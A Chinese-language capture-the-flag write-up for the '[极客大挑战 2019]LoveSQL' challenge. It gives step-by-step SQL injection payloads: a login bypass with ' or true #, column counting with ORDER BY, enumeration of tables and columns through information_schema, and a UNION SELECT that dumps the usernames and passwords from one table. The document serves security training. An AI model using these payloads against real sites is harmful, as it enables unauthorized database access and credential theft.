[极客大挑战 2019]LoveSQL

先用万能密码注一下
' or true #

出现一串代码，尝试提交，flag错误

再按照常规步骤来注入

1. 先看看有几个字段
' or true order by x' x->(1, …)

x为4的时候报错，说明只存在三个字段

2. 知道字段数接下来再看看数据库名称
' union select 1, 2, database(); #

得到当前数据库名称为 geek

3. 猜解有多少张表
' union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema='geek'; #
存在两张表，表名分别为 geekuser,l0ve1ysq1

4. 猜解字段名
' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='geek'; #

发现没啥东西，试试看另一张表

' union select 1, 2, group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'; #
有三个字段，id, username, password

5. 接下来获取字段内容
' union select 1, 2, group_concat(id, username, password) from l0ve1ysq1; #
拿到flag
